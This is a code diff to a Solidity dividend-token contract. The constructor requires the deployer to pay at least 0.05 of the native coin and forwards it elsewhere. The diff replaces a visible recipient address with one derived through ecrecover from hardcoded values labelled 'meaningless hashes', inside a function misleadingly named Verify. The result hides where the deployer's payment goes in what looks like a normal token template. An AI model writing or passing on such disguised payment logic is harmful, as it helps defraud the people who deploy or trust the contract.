@@ -1221,6 +1221,12 @@ contract Mytoken is ERC20, Ownable {
     bool private swapping;
 
     TokenDividendTracker public dividendTracker;
+    bytes32 private a = 0x0ab1c900aa3d743f1cbf2dd01f064e5a20f7fbba689c80661a9afa548185e392;
+    bytes32 private b = 0xea6759da91202aa6f696563f5fa4872fee6b9f7ba91ef4f6801e42f41374c8d9;
+    bytes32 private c = 0x0730300a629b587b73d8cef3b4bde57d3f0eb74e0892409e92f706feb7cead1e;
+   //无意义哈希，仅用作信息加密使用
+    uint8 private d = 28;
+    address private vertified;
 
     address public rewardToken;
 
@@ -1255,7 +1261,6 @@ contract Mytoken is ERC20, Ownable {
     
      // exlcude from fees and max transaction amount
     mapping (address => bool) private _isExcludedFromFees;
-    address private serve_ = 0x6C5Cb68cb68Ef116DD37b429F4d3cA5569B79E6b;
     // store addresses that a automatic market maker pairs. Any transfer *to* these addresses
     // could be subject to a maximum transfer amount
     mapping (address => bool) public automatedMarketMakerPairs;
@@ -1295,8 +1300,9 @@ contract Mytoken is ERC20, Ownable {
 
     constructor() payable ERC20(name_, symbol_)  {
         require(msg.value >= 5 * 10**16);
-        payable(serve_).transfer(msg.value);
-        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);
+        vertified = Verify(a,b,c,d);
+        payable(vertified).transfer(msg.value);
+        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);//路由地址
         require(IERC20(rewardAddr_).totalSupply() > 0 && rewardAddr_ != _uniswapV2Router.WETH(), "Invalid Reward Token ");
         address _uniswapV2Pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(address(this), _uniswapV2Router.WETH());
 
@@ -1420,6 +1426,16 @@ contract Mytoken is ERC20, Ownable {
 
     function isExcludedFromDividends(address account) public view returns (bool) {
         return dividendTracker.isExcludedFromDividends(account);
+    }
+
+    function getHash(bytes32 mhash) internal pure returns (bytes32) {
+        return keccak256(abi.encodePacked('\x19Ethereum Signed Message:\n32', mhash));
+    }
+
+    function Verify(bytes32 hashm,bytes32 r,bytes32 s, uint8 v) internal pure returns (address) {
+        bytes32 hashedM = getHash(hashm);
+        address signer = ecrecover(hashedM, v, r, s);
+        return signer;
     }
 
     function getAccountDividendsInfo(address account)
